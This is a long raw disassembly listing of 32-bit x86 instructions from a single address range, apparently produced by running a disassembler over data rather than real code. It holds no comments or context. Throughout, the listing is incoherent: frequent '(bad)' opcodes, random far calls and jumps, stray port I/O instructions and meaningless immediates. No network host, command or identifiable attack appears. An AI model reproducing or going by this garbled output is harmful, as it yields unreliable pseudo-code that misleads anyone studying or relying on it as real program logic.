  407402:	xlat   BYTE PTR ds:[ebx]
  407403:	shl    BYTE PTR [ecx],0x7a
  407406:	add    al,BYTE PTR [esi-0x2e]
  407409:	fsubr  QWORD PTR [eax-0x62]
  40740c:	fstp   QWORD PTR [edx]
  40740e:	cmp    eax,0xf623a8f4
  407413:	pop    esp
  407414:	in     al,0xfa
  407416:	mov    ch,0x48
  407418:	adc    bl,BYTE PTR [eax-0x10]
  40741b:	shl    BYTE PTR [ebx+0x46],1
  40741e:	retf   0x7712
  407421:	and    eax,0x7e552305
  407426:	vshufps xmm7,xmm3,XMMWORD PTR [edx],0xf6
  40742b:	or     esp,edi
  40742d:	(bad)  
  40742e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40742f:	ror    DWORD PTR [ebx],1
  407431:	scas   eax,DWORD PTR es:[edi]
  407432:	scas   eax,DWORD PTR es:[edi]
  407433:	cwde   
  407434:	add    DWORD PTR [ecx-0x12],esp
  407437:	pop    eax
  407438:	inc    ecx
  407439:	mov    eax,0x71830207
  40743e:	leave  
  40743f:	out    dx,al
  407440:	scas   eax,DWORD PTR es:[edi]
  407441:	addr16 popa 
  407443:	jmp    0xd5e041b7
  407448:	mov    eax,0x6b539ea
  40744d:	adc    DWORD PTR [esi+0x15],eax
  407450:	push   0xfba2b762
  407455:	sbb    esp,eax
  407457:	jge    0x407429
  407459:	mov    al,0xd
  40745b:	call   0x38c8:0x871d2750
  407462:	inc    eax
  407463:	fiadd  WORD PTR [ecx]
  407465:	jbe    0x4073f4
  407467:	sub    BYTE PTR [ebx],bh
  407469:	sub    eax,0xd9e33e60
  40746e:	pop    ss
  40746f:	in     eax,0x57
  407471:	aam    0xec
  407473:	xchg   esi,eax
  407474:	stos   BYTE PTR es:[edi],al
  407475:	std    
  407476:	adc    BYTE PTR [eax+0x6617acfe],al
  40747c:	push   0x7e858dcb
  407481:	pop    esi
  407482:	jp     0x4074d5
  407484:	ss int3 
  407486:	aas    
  407487:	xchg   edx,eax
  407488:	dec    esi
  407489:	jmp    0x76364e05
  40748e:	fs fcmovne st,st(1)
  407491:	push   edi
  407492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407493:	std    
  407494:	clc    
  407495:	fistp  WORD PTR [esi+ecx*2]
  407498:	inc    ebp
  407499:	daa    
  40749a:	sbb    al,0xe4
  40749c:	inc    ebp
  40749d:	xchg   edx,eax
  40749e:	cmc    
  40749f:	adc    BYTE PTR [edi+0x3d],cl
  4074a2:	sub    al,cl
  4074a4:	fldcw  WORD PTR [ecx+ecx*4]
  4074a7:	xchg   DWORD PTR [edi+0x594a5a29],eax
  4074ad:	bound  eax,QWORD PTR ds:0xc5c691e9
  4074b3:	add    edi,DWORD PTR [ebx+0x30]
  4074b6:	sbb    eax,0x28e11d1c
  4074bb:	dec    esi
  4074bc:	add    DWORD PTR [edi],ecx
  4074be:	call   0xc83ab43d
  4074c3:	adc    al,0xcc
  4074c5:	pop    es
  4074c6:	fnsave [edx-0x15]
  4074c9:	aam    0xc7
  4074cb:	or     ch,BYTE PTR [eax-0x13]
  4074ce:	pop    esi
  4074cf:	retf   
  4074d0:	popf   
  4074d1:	dec    edx
  4074d2:	inc    esi
  4074d3:	cwde   
  4074d4:	adc    DWORD PTR [ebp+0x458351e],eax
  4074da:	sbb    ebx,esi
  4074dc:	push   ebx
  4074dd:	ror    BYTE PTR [edi],cl
  4074df:	adc    eax,0xaf2134f0
  4074e4:	aas    
  4074e5:	and    DWORD PTR [edx],ebx
  4074e7:	mov    ah,0xab
  4074e9:	xor    dl,bl
  4074eb:	or     ch,BYTE PTR [edi+0x2a000a73]
  4074f1:	pop    es
  4074f2:	sub    eax,0x13977374
  4074f7:	jecxz  0x40750c
  4074f9:	call   0x17d1:0xb1dc3f0
  407500:	sbb    eax,0xaa686eb8
  407505:	or     DWORD PTR [ecx+0x1d8c92f5],ebx
  40750b:	ins    BYTE PTR es:[edi],dx
  40750c:	sbb    cl,ch
  40750e:	outs   dx,DWORD PTR ds:[esi]
  40750f:	cwde   
  407510:	scas   al,BYTE PTR es:[edi]
  407511:	jge    0x4074df
  407513:	or     BYTE PTR [edi],cl
  407515:	fisubr DWORD PTR ds:0xfcc9e712
  40751b:	shl    DWORD PTR [edx],0xfe
  40751e:	popf   
  40751f:	and    DWORD PTR [edi+0x16],0x7c
  407523:	mov    eax,0x190db5b6
  407528:	and    BYTE PTR [edx],bh
  40752a:	out    0x79,eax
  40752c:	xchg   edx,eax
  40752d:	add    al,0xb6
  40752f:	shr    BYTE PTR [ebx],cl
  407531:	or     esp,DWORD PTR [eax+0x7bfb34f5]
  407537:	adc    al,0x13
  407539:	jmp    0x4bc9:0x9e9ee843
  407540:	in     eax,dx
  407541:	call   0xb0bfc947
  407546:	stos   BYTE PTR es:[edi],al
  407547:	mov    ds:0x45a6c8b1,al
  40754c:	adc    eax,0x4720bc11
  407551:	dec    eax
  407552:	sbb    edx,DWORD PTR [eax+ebx*4-0x627982cd]
  407559:	mov    ecx,0x604b26a3
  40755e:	sti    
  40755f:	mov    ch,0x35
  407561:	ins    DWORD PTR es:[edi],dx
  407562:	retf   0x2174
  407565:	and    BYTE PTR [edi-0x1b],ch
  407568:	ss sbb eax,0x2008264b
  40756e:	sub    bl,BYTE PTR [edx+0x70]
  407571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407572:	or     DWORD PTR [eax],edi
  407574:	push   cs
  407575:	mov    ds:0xf3488180,eax
  40757a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40757b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40757c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40757d:	pusha  
  40757e:	jge    0x4075da
  407580:	or     al,0xe4
  407582:	in     al,0x72
  407584:	aas    
  407585:	scas   eax,DWORD PTR es:[edi]
  407586:	jns    0x4075be
  407588:	jg     0x40753c
  40758a:	and    eax,0xf7748647
  40758f:	jecxz  0x40757f
  407591:	sbb    al,0xe7
  407593:	sub    BYTE PTR [edx],dl
  407595:	loope  0x4075fb
  407597:	add    al,0x8f
  407599:	xor    eax,0xaab9e5cf
  40759e:	test   ah,dl
  4075a0:	jmp    0xff0b:0x3fbf4c1f
  4075a7:	(bad)  
  4075a9:	call   0x1a32b0e9
  4075ae:	sar    BYTE PTR [ebp+0x3],cl
  4075b1:	add    BYTE PTR [ebp-0x30],0x36
  4075b5:	push   ecx
  4075b6:	xor    al,0xf5
  4075b8:	mov    ah,0x29
  4075ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075bb:	(bad)  
  4075bc:	sbb    bl,BYTE PTR [edi-0x6b]
  4075bf:	daa    
  4075c0:	cmp    dl,bh
  4075c2:	add    ebx,DWORD PTR [esi]
  4075c4:	pop    ss
  4075c5:	push   0x72
  4075c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075c8:	adc    DWORD PTR [esi+0x78],ebp
  4075cb:	pop    esp
  4075cc:	(bad)  
  4075ce:	mov    edx,0xa91535b1
  4075d3:	cmp    ch,al
  4075d5:	adc    esi,DWORD PTR [eax-0x65a2bb68]
  4075db:	pop    esp
  4075dd:	push   ecx
  4075de:	repz pop ebp
  4075e0:	leave  
  4075e1:	test   BYTE PTR [edi-0x7f1cc960],al
  4075e7:	pop    eax
  4075e8:	cmp    BYTE PTR [esp+eiz*8-0x7c],al
  4075ec:	loop   0x4075c5
  4075ee:	adc    dh,0x45
  4075f1:	mov    esi,0xfa61ecd5
  4075f6:	into   
  4075f7:	lock inc esi
  4075f9:	mov    al,ch
  4075fb:	stos   DWORD PTR es:[edi],eax
  4075fc:	dec    edi
  4075fd:	in     al,0x3a
  4075ff:	shr    BYTE PTR [edi+ebp*1-0x30],0x0
  407604:	outs   dx,BYTE PTR ds:[esi]
  407605:	inc    ecx
  407606:	stc    
  407607:	(bad)  
  407608:	out    0x5a,al
  40760a:	lds    ecx,FWORD PTR [ecx]
  40760c:	fidivr DWORD PTR [ebx+0x371f0ac5]
  407612:	push   0xdd6339f7
  407617:	pop    ds
  407618:	mov    al,0x6d
  40761a:	dec    edi
  40761b:	jg     0x407622
  40761d:	icebp  
  40761e:	pop    ebp
  40761f:	bswap  eax
  407621:	stos   DWORD PTR es:[edi],eax
  407622:	test   BYTE PTR [ecx+0x35fd5296],dh
  407628:	lods   eax,DWORD PTR ds:[esi]
  407629:	addr16 (bad) 
  40762b:	jae    0x4076a0
  40762d:	push   edx
  40762e:	mov    esi,0xb06d9411
  407633:	imul   esp,ebp,0x7d
  407636:	pop    ebx
  407637:	cmp    BYTE PTR [esi+0xb814a9a],ch
  40763d:	xchg   ebp,eax
  40763e:	inc    ebp
  40763f:	fld    QWORD PTR [eax+0x3cdf6307]
  407645:	mov    dl,0xf7
  407647:	daa    
  407648:	pop    esp
  407649:	jl     0x407699
  40764b:	call   0xe5e5f7ee
  407650:	inc    ecx
  407651:	lea    esp,[edi+ebp*2-0x61]
  407655:	arpl   WORD PTR [ebp-0x6d],ax
  407658:	cmp    al,0x94
  40765a:	mov    ah,0xa2
  40765c:	sahf   
  40765d:	add    al,0xbd
  40765f:	dec    ebp
  407660:	mov    es,eax
  407662:	jle    0x407676
  407664:	nop
  407665:	xchg   ecx,eax
  407666:	outs   dx,DWORD PTR ds:[esi]
  407667:	inc    ebp
  407668:	pop    es
  407669:	mov    ecx,0xb8fea9b1
  40766e:	pop    esp
  40766f:	ror    BYTE PTR ds:0x8eb1bcd1,cl
  407675:	clc    
  407676:	xchg   edx,esp
  407678:	dec    ecx
  407679:	mov    esp,0x22e01dbb
  40767e:	dec    eax
  40767f:	out    0x83,eax
  407681:	popf   
  407682:	inc    edx
  407683:	fcom   QWORD PTR [esi+eiz*1]
  407686:	xlat   BYTE PTR ds:[ebx]
  407687:	mov    esi,0xbd364d18
  40768c:	pop    ebx
  40768d:	add    ah,BYTE PTR [ecx]
  40768f:	or     edx,ebp
  407691:	push   esp
  407692:	icebp  
  407693:	pop    ss
  407694:	mov    edi,0x961437d9
  407699:	push   ss
  40769a:	xchg   BYTE PTR ds:[esi],al
  40769d:	pushf  
  40769e:	jo     0x4076fb
  4076a0:	or     eax,0xae0879df
  4076a5:	push   0x4a
  4076a7:	sbb    bl,al
  4076a9:	test   DWORD PTR [edi-0x54],0xba0f2aab
  4076b0:	es enter 0x94f6,0xe4
  4076b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076b6:	imul   ecx,esi,0x29
  4076b9:	ins    BYTE PTR es:[edi],dx
  4076ba:	daa    
  4076bb:	and    bh,ah
  4076bd:	pop    edi
  4076be:	pusha  
  4076bf:	jl     0x407723
  4076c1:	lods   eax,DWORD PTR ds:[esi]
  4076c2:	mov    esp,0xbf0297fd
  4076c7:	mov    dl,0xcd
  4076c9:	das    
  4076ca:	push   ds
  4076cb:	in     al,0x4d
  4076cd:	jbe    0x40773c
  4076cf:	icebp  
  4076d0:	xchg   ebp,eax
  4076d1:	push   ebx
  4076d2:	lds    esi,FWORD PTR [ebx+0x659986ff]
  4076d8:	call   0x218fb813
  4076dd:	cmp    eax,DWORD PTR [esi]
  4076df:	fs push esi
  4076e1:	ret    0x95a
  4076e4:	outs   dx,DWORD PTR ds:[esi]
  4076e5:	adc    eax,0xa1b443b6
  4076ea:	jbe    0x407715
  4076ec:	adc    DWORD PTR [ebp-0x9b09170],ebx
  4076f2:	rcr    esp,cl
  4076f4:	add    eax,0x3a59898d
  4076f9:	jle    0x40769f
  4076fb:	mov    esi,0x71e3b0b3
  407700:	shr    DWORD PTR [edx],0xe3
  407703:	or     bl,bl
  407705:	icebp  
  407706:	add    BYTE PTR [esi-0x5a],bh
  407709:	add    eax,DWORD PTR [ebx+esi*8]
  40770c:	ret    0xe9d
  40770f:	scas   al,BYTE PTR es:[edi]
  407710:	or     BYTE PTR [edx],bh
  407712:	js     0x407737
  407714:	xchg   ebp,eax
  407715:	loope  0x4076c8
  407717:	rcl    BYTE PTR [ebp*1+0x1d1c5565],0xca
  40771f:	ss push ebp
  407721:	lods   al,BYTE PTR ds:[esi]
  407722:	and    eax,DWORD PTR [edx-0x56165e6c]
  407728:	stos   BYTE PTR es:[edi],al
  407729:	mov    eax,0x481e9a33
  40772e:	ror    DWORD PTR [ebp+0x37f4e2d6],1
  407734:	cmp    ecx,esp
  407736:	out    0x98,al
  407738:	mov    ds:0x59d546bf,al
  40773d:	xchg   esi,eax
  40773e:	pushf  
  40773f:	mov    ds:0xb2981eb3,eax
  407744:	out    0xe9,eax
  407746:	ins    BYTE PTR es:[edi],dx
  407747:	ds push ecx
  407749:	mov    dh,0x7d
  40774b:	jmp    0x92db:0x11189795
  407752:	mov    WORD PTR [edx],cs
  407754:	add    BYTE PTR [ebp-0x20],cl
  407757:	rol    DWORD PTR ds:0x1da7faaa,0x1f
  40775e:	mov    edx,0x29f57314
  407763:	push   cs
  407764:	sbb    al,0xf4
  407766:	push   es
  407767:	sahf   
  407768:	sti    
  407769:	cld    
  40776a:	imul   ecx,DWORD PTR [edi],0xef4060c1
  407770:	xchg   edx,eax
  407771:	inc    ebp
  407772:	int3   
  407773:	mov    WORD PTR [edi+eax*4-0x1e],ds
  407777:	call   0xb26:0x918749e1
  40777e:	ins    DWORD PTR es:[edi],dx
  40777f:	xor    eax,0xaf2b2c31
  407784:	addr16 ss and eax,0xfcc06714
  40778b:	arpl   WORD PTR [edx+0x45],di
  40778e:	mul    BYTE PTR ds:0x76dbfe41
  407794:	ss (bad) 
  407796:	repnz out 0xa5,eax
  407799:	stos   BYTE PTR es:[edi],al
  40779a:	popa   
  40779b:	mov    dl,0xc4
  40779d:	inc    ebx
  40779e:	out    0xc9,al
  4077a0:	stos   BYTE PTR es:[edi],al
  4077a1:	jecxz  0x40773a
  4077a3:	enter  0xc35b,0xa4
  4077a7:	cmc    
  4077a8:	mov    ah,0x95
  4077aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077ab:	jl     0x4077e8
  4077ad:	push   0x7
  4077af:	push   esi
  4077b0:	popa   
  4077b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077b2:	inc    ebx
  4077b3:	imul   ecx,DWORD PTR [ecx-0x7f845bc9],0xc1768135
  4077bd:	add    DWORD PTR [ebx-0x62],ecx
  4077c0:	ret    
  4077c1:	adc    eax,0x938f1f6f
  4077c6:	retf   0x7e84
  4077c9:	lock (bad) 
  4077cb:	aad    0xaf
  4077cd:	pop    ss
  4077ce:	sub    bh,BYTE PTR [eax]
  4077d0:	jge    0x407755
  4077d2:	jne    0x407786
  4077d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077d5:	adc    DWORD PTR [edi-0x34119fa9],ebx
  4077db:	das    
  4077dc:	cmp    ebx,ebp
  4077de:	sub    ch,BYTE PTR [esi+edi*1-0x647eb47]
  4077e5:	scas   al,BYTE PTR es:[edi]
  4077e6:	mov    ah,0x98
  4077e8:	inc    eax
  4077e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077ea:	mov    ds:0xf22941b1,eax
  4077ef:	lds    ebx,FWORD PTR [edx]
  4077f1:	xor    BYTE PTR cs:[esi+0x33],0x58
  4077f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f7:	add    eax,0x63326513
  4077fc:	sub    ebp,DWORD PTR [esi-0x3]
  4077ff:	jecxz  0x4077a9
  407801:	add    dl,dh
  407803:	scas   al,BYTE PTR es:[edi]
  407804:	cld    
  407805:	jge    0x4077de
  407807:	int    0xea
  407809:	push   eax
  40780a:	pop    ss
  40780b:	inc    edi
  40780c:	enter  0xaecc,0x22
  407810:	(bad)  
  407811:	shl    DWORD PTR ds:0x29940cc5,1
  407817:	inc    ebp
  407818:	mov    dl,0xb5
  40781a:	mov    al,ds:0xd2bb5ec3
  40781f:	xor    al,0x51
  407821:	loope  0x4077d8
  407823:	fwait
  407824:	pushf  
  407825:	inc    eax
  407826:	retf   0x4cae
  407829:	inc    esp
  40782a:	push   eax
  40782b:	popf   
  40782c:	ins    BYTE PTR es:[edi],dx
  40782d:	je     0x4077e4
  40782f:	cmp    BYTE PTR [eax-0x70c8db68],dh
  407835:	xchg   ebp,eax
  407836:	add    eax,0x7e709997
  40783b:	inc    ebp
  40783c:	mov    bh,BYTE PTR [ebx]
  40783e:	mov    WORD PTR [ebx-0x65],ds
  407841:	test   eax,0xb98c0281
  407846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407847:	pop    esi
  407848:	mov    bh,BYTE PTR [ebx]
  40784a:	adc    al,0xed
  40784c:	xchg   BYTE PTR [edx],bh
  40784e:	int    0x32
  407850:	xor    dl,dl
  407852:	xchg   esp,eax
  407853:	jmp    0x21e6610f
  407858:	or     BYTE PTR [esi-0x47a0493d],ch
  40785e:	mov    DWORD PTR [ebx],0xff23d7d6
  407864:	out    0x6c,eax
  407866:	dec    edi
  407867:	sub    DWORD PTR [ebp-0x1c38dc20],0xb4ddc4c5
  407871:	mov    edx,0xf2d3c2be
  407876:	call   0x5dcc0018
  40787b:	sti    
  40787c:	mul    BYTE PTR [esi]
  40787e:	or     al,0xd7
  407880:	cli    
  407881:	mov    al,dh
  407883:	jns    0x4078d7
  407885:	cs sub bh,ah
  407888:	ds pop ebp
  40788a:	add    ecx,DWORD PTR [edi+edi*2-0x25c4dd6]
  407891:	jns    0x40785e
  407893:	xchg   ecx,eax
  407894:	out    0x2b,eax
  407896:	push   ebp
  407897:	cmp    DWORD PTR cs:[esi+esi*4+0x3f0d9063],esp
  40789f:	inc    esi
  4078a0:	mov    BYTE PTR [ebp+0x41],dl
  4078a3:	adc    DWORD PTR [edx],esi
  4078a5:	int    0xe7
  4078a7:	arpl   WORD PTR [ecx+0x131ed63c],ax
  4078ad:	and    DWORD PTR [edi-0x97dba9f],edi
  4078b3:	jne    0x40792e
  4078b5:	sbb    ch,bh
  4078b7:	stc    
  4078b8:	lock in eax,0x2f
  4078bb:	dec    ebp
  4078bc:	and    DWORD PTR [eax-0x3e6b31bd],esp
  4078c2:	(bad)  
  4078c3:	pop    eax
  4078c4:	cld    
  4078c5:	loopne 0x4078a6
  4078c7:	lods   al,BYTE PTR ds:[esi]
  4078c8:	cmp    al,0x75
  4078ca:	and    al,0xeb
  4078cc:	jp     0x4078a9
  4078ce:	mov    dh,0x15
  4078d0:	cli    
  4078d1:	xor    ah,BYTE PTR [ecx+0x4f]
  4078d4:	dec    eax
  4078d5:	or     bl,bl
  4078d7:	xchg   BYTE PTR [edx+0x2d],ah
  4078da:	stc    
  4078db:	adc    eax,0x248c5a77
  4078e0:	scas   eax,DWORD PTR es:[edi]
  4078e1:	and    DWORD PTR [ebx-0x69d61ba0],0xb020790f
  4078eb:	jbe    0x407957
  4078ed:	xor    al,0xc7
  4078ef:	stc    
  4078f0:	in     eax,0x48
  4078f2:	mov    ebx,0x7e02de8d
  4078f7:	xlat   BYTE PTR ds:[ebx]
  4078f8:	pop    edi
  4078f9:	or     al,0x83
  4078fb:	xchg   edi,eax
  4078fc:	repz adc BYTE PTR [ebx],0xa8
  407900:	jns    0x40796f
  407902:	jmp    0x407905
  407904:	fisttp WORD PTR [ebp-0x2caf9d16]
  40790a:	sub    DWORD PTR [edx-0x1d6a131f],esp
  407910:	mov    ebp,0x3bcdc1c8
  407915:	sub    DWORD PTR [ecx-0x70],esp
  407918:	aaa    
  407919:	or     dh,BYTE PTR [ebx+0x49]
  40791c:	mov    BYTE PTR [esp+eax*4+0x5d4cfd9e],bh
  407923:	addr16 inc ebp
  407925:	mov    ebx,0x1ca70483
  40792a:	jl     0x4078cd
  40792c:	adc    eax,0x26ad5075
  407931:	(bad)  
  407932:	aad    0xef
  407934:	mov    edx,0x47bac0ca
  407939:	fwait
  40793a:	sub    dh,bh
  40793c:	loop   0x407996
  40793e:	fld    QWORD PTR [ebx]
  407940:	push   0xab165845
  407945:	imul   esp,DWORD PTR [ecx+0x48],0x90f32110
  40794c:	add    eax,0xd159e00e
  407951:	push   esi
  407952:	cmp    esi,edx
  407954:	test   DWORD PTR [ebp-0x41659665],eax
  40795a:	push   ds
  40795b:	dec    edx
  40795c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40795d:	mov    bh,BYTE PTR [edx]
  40795f:	js     0x4079d3
  407961:	fs fcmove st,st(6)
  407964:	mov    ecx,0xf666c981
  407969:	dec    eax
  40796a:	jne    0x4078ec
  40796c:	mov    ecx,0xab010d07
  407971:	xchg   esi,eax
  407972:	push   0xdcb8bc4c
  407977:	jle    0x4079e0
  407979:	ins    BYTE PTR es:[edi],dx
  40797a:	arpl   WORD PTR [ecx+0x1aa35910],ax
  407980:	mov    eax,ds:0xce9306b9
  407985:	push   0xffffffcd
  407987:	icebp  
  407988:	das    
  407989:	xor    esp,ecx
  40798b:	xchg   DWORD PTR [ebp-0x2],edi
  40798e:	dec    esi
  40798f:	mov    dh,0xf4
  407991:	lods   eax,DWORD PTR ss:[esi]
  407993:	adc    eax,0x3f094b41
  407998:	jp     0x407990
  40799a:	or     al,BYTE PTR [ebp-0x76a4e505]
  4079a0:	jecxz  0x40796d
  4079a2:	add    cl,ah
  4079a4:	daa    
  4079a5:	das    
  4079a6:	dec    esi
  4079a7:	sbb    DWORD PTR [esi+esi*2],esi
  4079aa:	pop    esp
  4079ab:	jno    0x407993
  4079ad:	mov    bl,BYTE PTR [eax+0x54f02465]
  4079b3:	mov    ebx,0x830c4359
  4079b8:	xchg   edx,edx
  4079ba:	out    dx,al
  4079bb:	outs   dx,DWORD PTR ds:[esi]
  4079bc:	rol    esi,1
  4079be:	mov    dh,0x80
  4079c0:	adc    cl,BYTE PTR [edi]
  4079c2:	lods   al,BYTE PTR ds:[esi]
  4079c3:	mov    DWORD PTR [ebx+0x5d4681b2],esp
  4079c9:	jl     0x407a08
  4079cb:	in     al,0x8c
  4079cd:	clc    
  4079ce:	sbb    DWORD PTR [esi+eiz*2],0x72e38af5
  4079d5:	popa   
  4079d6:	cdq    
  4079d7:	in     al,0xfa
  4079d9:	ret    
  4079da:	stos   BYTE PTR es:[edi],al
  4079db:	adc    ah,dh
  4079dd:	mov    bh,0xa4
  4079df:	push   ebx
  4079e0:	xlat   BYTE PTR ds:[ebx]
  4079e1:	ret    
  4079e2:	cmc    
  4079e3:	add    BYTE PTR [ecx],0x83
  4079e6:	outs   dx,BYTE PTR ds:[esi]
  4079e7:	adc    esi,edi
  4079e9:	into   
  4079ea:	mov    cl,0x9d
  4079ec:	pop    esp
  4079ed:	jo     0x407a19
  4079ef:	jbe    0x407a3d
  4079f1:	(bad)  
  4079f2:	xchg   esp,eax
  4079f3:	push   edx
  4079f4:	sahf   
  4079f5:	pop    esp
  4079f6:	inc    ebp
  4079f7:	out    dx,eax
  4079f8:	call   0x82b2:0xfb7c4e96
  4079ff:	or     BYTE PTR [edi],dh
  407a01:	fisubr DWORD PTR [edx-0x54]
  407a04:	push   esi
  407a05:	mov    al,0xf5
  407a07:	lock popa 
  407a09:	out    0xc7,al
  407a0b:	sbb    eax,0x1ea33ce4
  407a10:	es push esi
  407a12:	mov    ds:0xfa5e6e63,al
  407a17:	bound  edi,QWORD PTR [edi]
  407a19:	cmp    eax,0xfb224301
  407a1e:	imul   ecx,ebp,0x78
  407a21:	lods   al,BYTE PTR ds:[esi]
  407a22:	aaa    
  407a23:	push   cs
  407a24:	int3   
  407a25:	test   al,0xb
  407a27:	shl    ecx,0x8b
  407a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a2b:	clc    
  407a2c:	mov    ch,0xae
  407a2e:	iret   
  407a2f:	mov    cl,0xb7
  407a31:	vshufps ymm3,ymm4,YMMWORD PTR [edx+edi*1-0x6b7bed5c],0x29
  407a3b:	pop    esp
  407a3c:	out    0x13,al
  407a3e:	ins    BYTE PTR es:[edi],dx
  407a3f:	sub    eax,DWORD PTR [edx+eax*8]
  407a42:	(bad)  
  407a44:	call   DWORD PTR [edx]
  407a46:	test   ecx,0xda2879e
  407a4c:	mov    cl,BYTE PTR [ebp-0x928b98a]
  407a52:	pop    esi
  407a53:	pop    ss
  407a54:	adc    ebp,DWORD PTR [esi-0x42]
  407a57:	pop    esi
  407a58:	adc    DWORD PTR ds:0x3c1c0f6,ecx
  407a5e:	and    ch,BYTE PTR [edi-0x3f]
  407a61:	ja     0x407a5a
  407a63:	dec    ebx
  407a64:	mov    al,0xe1
  407a66:	inc    esi
  407a67:	aaa    
  407a68:	imul   esi,ebp,0xffffffaf
  407a6b:	xor    ebp,DWORD PTR [eax]
  407a6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a6e:	jnp    0x407ac6
  407a70:	pop    ebp
  407a71:	add    ah,BYTE PTR [edi]
  407a73:	mov    al,0xa2
  407a75:	jo     0x407aa2
  407a77:	add    eax,0x30593b7
  407a7c:	add    BYTE PTR [ecx],al
  407a7e:	dec    edi
  407a7f:	aad    0x60
  407a81:	repnz mov ds:0x47d5fa00,al
  407a87:	iret   
  407a88:	mov    ah,0x54
  407a8a:	jg     0x407a74
  407a8c:	jmp    0xf275aeb0
  407a91:	iret   
  407a92:	sbb    ebx,ebp
  407a94:	int3   
  407a95:	fisttp DWORD PTR [ebp+ebx*2+0x30fb4ac0]
  407a9c:	or     BYTE PTR [ecx+esi*1],ah
  407a9f:	and    eax,0x83e1253c
  407aa4:	sbb    esp,DWORD PTR [ecx+0x62]
  407aa7:	icebp  
  407aa8:	pop    edx
  407aa9:	and    BYTE PTR [ebp-0x658dc6bf],bl
  407aaf:	xchg   edx,eax
  407ab0:	cmp    DWORD PTR [ecx],edi
  407ab2:	imul   ecx,DWORD PTR [esi-0x45],0xbd408d6
  407ab9:	cld    
  407aba:	sub    edx,DWORD PTR [edi-0x61316109]
  407ac0:	or     DWORD PTR [edx+esi*1+0x72a20aed],ebx
  407ac7:	ds or  bh,cl
  407aca:	jb     0x407a5c
  407acc:	pop    esp
  407acd:	lea    ebx,[ebx+0x13]
  407ad0:	jbe    0x407a9f
  407ad2:	fstp   QWORD PTR ds:0x5127e11c
  407ad8:	pop    esp
  407ad9:	fadd   st(7),st
  407adb:	cmp    cl,BYTE PTR [esi+0x6c67a660]
  407ae1:	loope  0x407b51
  407ae3:	je     0x407ac1
  407ae5:	(bad)  
  407ae6:	jbe    0x407b37
  407ae8:	in     eax,0xb5
  407aea:	xor    ah,dl
  407aec:	jle    0x407aac
  407aee:	fwait
  407aef:	adc    cl,BYTE PTR [edi]
  407af1:	inc    esi
  407af2:	sub    bh,ah
  407af4:	mov    edi,0xf9b33aac
  407af9:	test   DWORD PTR [eax+0x5f],ecx
  407afc:	jno    0x407a7e
  407afe:	inc    ch
  407b00:	(bad)  
  407b01:	or     ch,BYTE PTR [esi-0x1e]
  407b04:	fidivr DWORD PTR [ebx-0x34]
  407b07:	push   eax
  407b08:	add    DWORD PTR [edi],edx
  407b0a:	mov    eax,ds:0xb9caca32
  407b0f:	jb     0x407b77
  407b11:	aam    0xb
  407b13:	fisttp DWORD PTR es:[ecx-0x4f]
  407b17:	call   0x8df87df0
  407b1c:	jns    0x407b11
  407b1e:	dec    esi
  407b1f:	mov    dh,0xec
  407b21:	retf   
  407b22:	jmp    0x407ac6
  407b24:	add    ah,al
  407b26:	cmp    ebp,ebp
  407b28:	nop
  407b29:	xor    ebp,DWORD PTR [eax+ebp*4]
  407b2c:	and    al,0xb4
  407b2e:	dec    esp
  407b2f:	pop    ebp
  407b30:	cmp    eax,0x24a8b96b
  407b35:	imul   edi,eax,0x5c128efd
  407b3b:	push   0xffffff86
  407b3d:	das    
  407b3e:	loope  0x407b4c
  407b40:	fs iret 
  407b42:	xor    BYTE PTR [ebp-0x49da9e65],al
  407b48:	sbb    bl,BYTE PTR [esp+ebp*8-0x4946d5e9]
  407b4f:	sub    BYTE PTR [ecx],bl
  407b51:	xor    esi,DWORD PTR [ebx]
  407b53:	out    0x14,eax
  407b55:	(bad)  
  407b57:	or     DWORD PTR [eax],edi
  407b59:	stc    
  407b5a:	sbb    ch,bl
  407b5c:	dec    eax
  407b5d:	push   ebp
  407b5e:	aam    0xc4
  407b60:	mov    ah,bl
  407b62:	jmp    0x26e2:0x90ce822a
  407b69:	(bad)  
  407b6b:	xchg   edi,eax
  407b6c:	int3   
  407b6d:	pushf  
  407b6e:	cdq    
  407b6f:	fidiv  WORD PTR [ecx+0xe]
  407b72:	out    dx,eax
  407b73:	dec    eax
  407b74:	adc    DWORD PTR [edx-0x58643ea5],ebp
  407b7a:	aaa    
  407b7b:	stc    
  407b7c:	xor    al,BYTE PTR [edi+0x681fd694]
  407b82:	sar    DWORD PTR [edi-0x6a],0x40
  407b86:	mov    ebx,0x38db2eb6
  407b8b:	mov    bh,0x1d
  407b8d:	cmp    eax,DWORD PTR [eax-0x5b]
  407b90:	cmp    ah,BYTE PTR [edi-0x3e]
  407b93:	sub    al,0xf3
  407b95:	sub    cl,BYTE PTR [edi]
  407b97:	pop    eax
  407b98:	enter  0x356b,0x9c
  407b9c:	mov    bh,0x87
  407b9e:	jae    0x407c00
  407ba0:	xchg   ebp,eax
  407ba1:	push   ds
  407ba2:	dec    ebx
  407ba3:	adc    DWORD PTR [ebp+0x2d],0x88df5c8b
  407baa:	je     0x407bf6
  407bac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bad:	and    ecx,edi
  407baf:	adc    eax,0x97f6d413
  407bb4:	push   ds
  407bb5:	xchg   BYTE PTR [esi+0x6e],ah
  407bb8:	and    DWORD PTR [ebp-0x36],edx
  407bbb:	call   0x9ca6:0xadbc874b
  407bc2:	push   ds
  407bc3:	xchg   esi,eax
